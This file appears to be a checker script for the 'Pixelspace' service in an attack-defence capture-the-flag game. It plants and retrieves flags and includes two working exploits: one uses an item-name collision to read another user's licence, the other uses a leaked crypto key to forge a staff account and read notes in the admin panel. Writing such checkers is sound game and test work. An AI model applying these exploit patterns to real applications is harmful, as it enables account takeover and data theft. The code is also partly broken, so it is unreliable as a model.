from calendar import c
import secrets
from typing import Optional
from urllib.request import CacheFTPHandler
from xmlrpc.client import ResponseError
from httpx import AsyncClient
from util import *


from enochecker3 import(
    ChainDB,
    Enochecker,

    MumbleException,
    InternalErrorException,

    #FLAG-Message-Tasks
    GetflagCheckerTaskMessage,
    PutflagCheckerTaskMessage,

    #NOISE-Message-Tasks
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,

    #HAVOC-Message-Tasks
    HavocCheckerTaskMessage,

    #EXPLOIT-Message-Tasks
    ExploitCheckerTaskMessage,


    
)

from enochecker3.utils import FlagSearcher, assert_equals, assert_in

checker = Enochecker("Pixelspace",8010)
def app(): return checker.app
####################### GETFLAG AND PUTFLAG #########################
@checker.putflag(0)
async def putflag_license(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:   
    item_name = exploitable_item_name(min_length=5)
    user = await register_user(client=client,logger=None,db=db)
    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': task.flag,
    }
    
    await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': 100.0,
        'description': 'THIS IS SUPER EXPENSIVE GG CHECKER',
    }
    await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
    await db.set("license_flag",{'flag':task.flag,'user':user['username'],'password':user['password1'],'item':item_name})


@checker.getflag(0)
async def getflag_license(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    item_id = -1
    regex_item = '<a href="(.+?)">View Item</a>'
    regex_license = '<a href="/(.+?)">View License</a>'

    try: 
        object = await db.get("license_flag")
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    login_kwargs={
        'username': object['user'],
        'password': object['password'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('user_items/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")
    
    
    item_id = re.findall(regex_item,response.text)[0]
    if item_id == -1:
        raise MumbleException("Errow while searching for flag item (license)!")

    try:  
        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing user item with id: {item_id}")
    
    license_url = re.findall(regex_license,response.text)[0]

    try:
        response = await client.get(f"{license_url}",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing license of user item with id: {item_id}")
        
    if task.flag not in response.text:
        raise MumbleException(f"Error - Flag not in response text!")
    assert_in(task.flag,response.text)
    

@checker.putflag(1)
async def putflag_notes(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:    
    user = await register_user(client=client,logger=None,db=db)
    note_kwargs = {
        'note':task.flag,
        'logged_in': True,
    }
    await create_note(client=client,logger=None,db=db,kwargs=note_kwargs)
    await db.set('note_flag',{'flag':task.flag,'user':user['username'],'password':user['password1']})


@checker.getflag(1)
async def getflag_notes(task: GetflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    regex_notes = '<input type="text" name="notes" value="(.+?)" maxlength="50000" required id="id_notes">'
    try: 
        object = await db.get("note_flag")
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    login_kwargs={
        'username': object['user'],
        'password': object['password'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_kwargs)
    try:
        response = await client.get('notes/',follow_redirects=True)
    except RequestError:
        raise MumbleException("Error while retrieving user items!")

    match = re.findall(regex_notes,response.text)[0]
    assert_in(task.flag,match)

####################### GETNOISE AND PUTNOISE #########################

@checker.putnoise(0)
async def put_noise(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    assert_equals(1,2)

@checker.getnoise(0)
async def get_noise(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    assert_equals(1,2)

############################## EXPLOITS ################################

@checker.exploit(0)
async def exploit_license(task: ExploitCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    regex_license = '<a href="/(.+?)">View License</a>'
    try:
        params = await db.get('license_flag')
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    user = await register_user(client=client,logger=None,db=db)
    item_name = await make_item_name_exploitable(item_name=params['item'])

    shop_item_kwargs =  {
        'data_path': '/frog.png',
        'item_name': item_name,
        'logged_in': True,
        'flag_str': 'This is just an exploit',
    }
    
    await create_ShopItem(client=client,logger=None,db=db,kwargs=shop_item_kwargs)
    shop_listing_kwargs = {
        'item_name': item_name,
        'item_price': 0.01,
        'description': 'This is exploitable',
    }
    await create_ShopListing(client=client,logger=None,db=db,kwargs=shop_listing_kwargs)
    await logout_user(client=client,logger=None,db=db,kwargs={'logged_in':True})
    user = await register_user(client=client,logger=None,db=db)
    try:
        response = await client.get('shop/',follow_redirects=True)
    except ResponseError:
        raise MumbleException("EXPLOIT_LICENSE - Error while requesting endpoint shop!")
    
    item_id=((response.text.split(item_name)[1]).split('<a href="')[1]).split('"')[0]

    try:
        response = await client.get(f'shop/purchase/{item_id}',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}")

    try:
        response = await client.get(f'user_items/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}") 

    try:
        response = await client.get(f'user_items/{item_id}',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_LICENSE - Error while requesting item with id {item_id}") 
    
    license_url = re.findall(regex_license,response.text)[0]
    
    try:
        response = await client.get(f"{license_url}",follow_redirects=True)
    except RequestError:
        raise MumbleException(f"Error while viewing license of user item with id: {item_id}")

    flag_in_license = params['flag'] in response.text
    assert_equals(flag_in_license,True,message="Could not find flag in license_file")  


@checker.exploit(1)
async def exploit_staff(task: ExploitCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    key_regex = '<p>Crypt Key: (.+?)</p>'

    try:
        params = await db.get('note_flag')
    except DBSearchError:
        raise MumbleException("Could not retrieve data from ChainDB!")

    user = await register_user(client=client,logger=None,db=db)
    
    try:
        response = await client.get(f'user_items/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while requesting users cryptographic key!") 

    
    matches = re.findall(key_regex,response.text)
    staff_kwargs =  {
    'data': user,
    'key': matches[0],
    'salt': 776, #needs to be environmental, static for now
    }

    try:
        response = await client.get(f'logout/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while logging out!")
    
    staff_user = await create_staff_user(client=client,logger=None,db=db,kwargs=staff_kwargs)

    login_data = {
        'username':staff_user['username'],
        'password':staff_user['password1'],
    }
    await login(client=client,logger=None,db=db,kwargs=login_data)
    
    try:
        response = await client.get(f'admin/pixels/profile/',follow_redirects=True)
    except ResponseError:
        raise MumbleException(f"EXPLOIT_NOTE - Error while changing to admin panel!")

    profile_regex = '<a href="/admin/pixels/profile/(.+?)/change/'
    
    profiles = re.findall(profile_regex,response.text)
    comment_regex = '<label>Notes:</label>'
    found_flag = False
    notes = []
    for prof in profiles:
        try:
            response = await client.get(f'admin/pixels/profile/{int(prof)}/change/',follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"EXPLOIT_NOTE - Error while requesting profile with num{int(prof)}!")
        
        note = ((response.text.split(comment_regex)[1]).split('<div class="readonly">')[1]).split("</div>")[0]
        notes.append(note)
        if params['flag'] in note or params['flag'] == note:
            found_flag = True
            assert_in(params['flag'],note)
            break
    if found_flag:
        assert_equals(1,1)
    else:
        print(params['flag'])
        print(notes)
        assert_equals(1,2)

############################### HAVOCS #################################

@checker.havoc(0)
async def havoc_endpoints(task: HavocCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    endpoints = [
        '',
        'signup/',
        'login/',
        'shop/',
        #'user_items/',
        'new_item/',
        #'notes/',
        #'giftcode/',
    ]
    for e in endpoints:
        try:
            response = await client.get(e,follow_redirects=True)
        except ResponseError:
            raise MumbleException(f"HAVOC - Cannot reach endpoint <{e}> !")
    assert_equals(1,1)

    
if __name__ == "__main__":
    checker.run()
